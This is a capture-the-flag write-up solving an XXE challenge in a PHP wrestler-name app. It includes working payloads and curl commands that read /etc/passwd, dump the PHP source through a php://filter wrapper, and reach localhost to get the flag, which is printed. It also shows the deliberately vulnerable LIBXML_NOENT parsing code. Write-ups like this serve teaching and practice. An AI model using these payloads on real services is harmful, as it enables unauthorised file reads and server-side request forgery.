# Wrestler Name Generator
Web, 150 points

## Description

> Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.


## Solution

We visit the attaches site and see a form:

```html
<form>
  <div class="form-group">
    <label style="color:white" for="exampleFormControlInput1">First Name</label>
    <input type="email" class="form-control" id="firstName" placeholder="First">
  </div>
  <div class="form-group">
    <label style="color:white" for="exampleFormControlInput1">Last Name</label>
    <input type="email" class="form-control" id="lastName" placeholder="Last">
  </div>
  <div class="form-group">
    <label style="color:white" for="exampleFormControlSelect1">Weapon of Choice</label>
    <select class="form-control" id="weapon">
      <option>Steel Chair</option>
      <option>Flaming Table</option>
      <option>Barb Wire Bat</option>
      <option>Ladder</option>
      <option>Thumbtacks</option>
    </select>
  </div>
</form>
```

Submitting the form triggers the following script:

```html
<script>
document.getElementById("button").onclick = function() {
  var firstName = document.getElementById("firstName").value;
  var lastName = document.getElementById("lastName").value;
  var input = btoa("<?xml version='1.0' encoding='UTF-8'?><input><firstName>" + firstName + "</firstName><lastName>" + lastName+ "</lastName></input>");
  window.location.href = "/generate.php?input="+encodeURIComponent(input);
};
</script>
```

The form input is translated to XML. This method might be vulnerable to XXE.

> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

Let's perform a simple proof of concept, taken from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection).

We try to send the following XML:

```xml
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<input>
    <firstName>John</firstName>
    <lastName>&example;</lastName>
</input>
```

If the service is vulnerable to XXE, the result will return as "John Doe".

```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# echo '<?xml version="1.0" ?><!DOCTYPE replace [<!ENTITY example "Doe"> ]><input><firstName>John</firstName><lastName>&example;</lastName></input>' | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Ferocious" Doe</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

It worked!

Let's try reading a file from the server:
```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<input><firstName>John</firstName><lastName>&test;</lastName></input>
TEXT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Slasher" root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

Looks good, we are able to read files.

What happens if we enter bad input?
```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
bad input
TEXT

<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Start tag expected, '&lt;' not found in <b>/var/www/html/generate.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): bad input in <b>/var/www/html/generate.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): ^ in <b>/var/www/html/generate.php</b> on line <b>23</b><br />
Error parsing XML:
bad input
```

The server discloses the php file path - and we can try to read it:

```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<?xml version="1.0"?>
> <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///var/www/html/generate.php'>]>
> <input><firstName>John</firstName><lastName>&test;</lastName></input>
> TEXT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Brute"
</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

This didn't work, but what if we try to base64 encode the file using PHP's filters?

```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<?xml version="1.0"?>
> <!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/generate.php'>]>
> <input><firstName>John</firstName><lastName>&test;</lastName></input>
> TEXT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Hacker" PD9waHAKCiR3aGl0ZWxpc3QgPSBhcnJheSgKICAgICcxMjcuMC4wLjEnLAogICAgJzo6MScKKTsKLy8gaWYgdGhpcyBwYWdlIGlzIGFjY2Vzc2VkIGZyb20gdGhlIHdlYiBzZXJ2ZXIsIHRoZSBmbGFnIGlzIHJldHVybmVkCi8vIGZsYWcgaXMgaW4gZW52IHZhcmlhYmxlIHRvIGF2b2lkIHBlb3BsZSB1c2luZyBYWEUgdG8gcmVhZCB0aGUgZmxhZwovLyBSRU1PVEVfQUREUiBmaWVsZCBpcyBhYmxlIHRvIGJlIHNwb29mZWQgKHVubGVzcyB5b3UgYWxyZWFkeSBhcmUgb24gdGhlIHNlcnZlcikKaWYoaW5fYXJyYXkoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICR3aGl0ZWxpc3QpKXsKCWVjaG8gJF9FTlZbIkZMQUciXTsKCXJldHVybjsKfQovLyBtYWtlIHN1cmUgdGhlIGlucHV0IHBhcmFtZXRlciBleGlzdHMKaWYgKGVtcHR5KCRfR0VUWyJpbnB1dCJdKSkgewoJZWNobyAiUGxlYXNlIGluY2x1ZGUgdGhlICdpbnB1dCcgZ2V0IHBhcmFtZXRlciB3aXRoIHlvdXIgcmVxdWVzdCwgQnJvdGhlciI7CglyZXR1cm47Cn0KCi8vIGdldCBpbnB1dAokeG1sRGF0YSA9IGJhc2U2NF9kZWNvZGUoJF9HRVRbImlucHV0Il0pOwovLyBwYXJzZSB4bWwKJHhtbD1zaW1wbGV4bWxfbG9hZF9zdHJpbmcoJHhtbERhdGEsIG51bGwsIExJQlhNTF9OT0VOVCkgb3IgZGllKCJFcnJvciBwYXJzaW5nIFhNTDogIi4iXG4iLiR4bWxEYXRhKTsKJGZpcnN0TmFtZSA9ICR4bWwtPmZpcnN0TmFtZTsKJGxhc3ROYW1lID0gJHhtbC0+bGFzdE5hbWU7Ci8vIGdlbmVyYXRlIG5hbWUKJG5vdW5zID0gYXJyYXkoIktpbGxlciIsICJTYXZhZ2UiLCAiU3RhbGxpb24iLCAiQ29kZXIiLCAiSGFja2VyIiwgIlNsYXNoZXIiLCAiQ3J1c2hlciIsICJCYXJiYXJpYW4iLCAiRmVyb2Npb3VzIiwgIkZpZXJjZSIsICJWaWNpb3VzIiwgIkh1bnRlciIsICJCcnV0ZSIsICJUYWN0aWNpYW4iLCAiRXhwZXJ0Iik7CiRub3VuID0gJG5vdW5zW2FycmF5X3JhbmQoJG5vdW5zKV07CiRnZW5lcmF0ZWROYW1lID0gJGZpcnN0TmFtZS4nICJUaGUgJy4kbm91bi4nIiAnLiRsYXN0TmFtZTsKCi8vIHJldHVybiBodG1sIGZvciB0aGUgcmVzdWx0cyBwYWdlCmVjaG8gPDw8RU9UCjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogIDx0aXRsZT5XcmVzdGxlciBOYW1lIEdlbmVyYXRvcjwvdGl0bGU+CiAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSI+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3RzdHJhcC80LjMuMS9jc3MvYm9vdHN0cmFwLm1pbi5jc3MiPgogIDxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjMuMS9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvcG9wcGVyLmpzLzEuMTQuNy91bWQvcG9wcGVyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuMy4xL2pzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgoKPGRpdiBjbGFzcz0ianVtYm90cm9uIHRleHQtY2VudGVyIj4KICA8aDE+WW91ciBXcmVzdGxlciBOYW1lIElzOjwvaDE+CiAgPGgyPiRnZW5lcmF0ZWROYW1lPC9oMj4gCjwhLS1oYWNrZXIgbmFtZSBmdW5jdGlvbmFsaXR5IGNvbWluZyBzb29uIS0tPgo8IS0taWYgeW91J3JlIHRyeWluZyB0byB0ZXN0IHRoZSBoYWNrZXIgbmFtZSBmdW5jdGlvbmFsaXR5LCBtYWtlIHN1cmUgeW91J3JlIGFjY2Vzc2luZyB0aGlzIHBhZ2UgZnJvbSB0aGUgd2ViIHNlcnZlci0tPgo8IS0tPGgyPllvdXIgSGFja2VyIE5hbWUgSXM6IFJFREFDVEVEPC9oMj4tLT4KICA8YSBocmVmPSIvIj5HbyBCYWNrPC9hPiAKPC9kaXY+CjwvYm9keT4KPC9odG1sPgpFT1Q7Cj8+Cg==</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

That's more like it. The decoded text is:

```php
<?php

$whitelist = array(
    '127.0.0.1',
    '::1'
);
// if this page is accessed from the web server, the flag is returned
// flag is in env variable to avoid people using XXE to read the flag
// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)
if(in_array($_SERVER['REMOTE_ADDR'], $whitelist)){
	echo $_ENV["FLAG"];
	return;
}
// make sure the input parameter exists
if (empty($_GET["input"])) {
	echo "Please include the 'input' get parameter with your request, Brother";
	return;
}

// get input
$xmlData = base64_decode($_GET["input"]);
// parse xml
$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die("Error parsing XML: "."\n".$xmlData);
$firstName = $xml->firstName;
$lastName = $xml-
```

Good enough to point us in the right direction - we just have to access the page from within the server.
In retrospective - This should have been clear from the comment in the HTML file:
```html
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
```

Anyway, here's how to do it:

```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<?xml version="1.0"?>
> <!DOCTYPE root [<!ENTITY test SYSTEM 'http://127.0.0.1/generate.php'>]>
> <input><firstName>John</firstName><lastName>&test;</lastName></input>
> TEXT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Coder" sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

The flag: sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}